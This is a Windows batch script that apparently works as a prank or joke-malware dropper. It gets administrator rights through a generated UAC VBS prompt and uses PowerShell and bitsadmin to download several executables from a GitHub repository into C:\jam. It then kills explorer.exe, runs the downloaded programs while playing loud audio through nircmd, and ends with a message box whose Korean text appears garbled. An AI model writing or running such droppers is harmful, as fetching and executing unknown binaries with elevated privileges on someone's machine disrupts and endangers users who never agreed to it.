@echo off
cls
:: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /b

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
cd /d C:\
md jam
cd jam
md files
md musics

powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/jam/raw/main/sans.mp3','C:\jam\musics\sans.mp3')"
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/jam/raw/main/jamimg.exe','C:\jam\files\jamimg.exe')"
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/jam/raw/main/jammin.exe','C:\jam\files\jammin.exe')"

powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/jam/raw/main/5Shake.exe','C:\jam\files\5Shake.exe')"
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/jam/raw/main/color.exe','C:\jam\files\color.exe')"
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/jam/raw/main/glich.exe','C:\jam\files\glich.exe')"

powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/jam/raw/main/glich.exe','C:\jam\files\glich.exe')"
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/jam/raw/main/rgbtrain.exe','C:\jam\files\rgbtrain.exe')"
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/BAtchfiler0/jam/raw/main/jammin.png','C:\jammin.png')"

bitsadmin.exe /transfer "JAMJAM File Download" https://github.com/BAtchfiler0/Covid/raw/main/nircmd.exe "C:\jam\files\nircmd.exe"

taskkill /f /im explorer.exe

start /min "" "files\jammin.exe"
start files\jamimg.exe
start C:\jam\files\nircmd mediaplay 500000 C:\jam\musics\sans.mp3
timeout /t 30
start explorer.exe
start /min "" "C:\jam\files\rgbtrain.exe"
timeout /t 20
taskkill /f /im rgbtrain.exe
taskkill /f /im jammin.exe
taskkill /f /im jamimg.exe
taskkill /f /im nircmd.exe

echo msgbox "せせせせせせせ 戚腰幻 坐層陥せせせせせせせせせ", 16 , "宣肯戚">msg.vbs
start msg.vbs
exit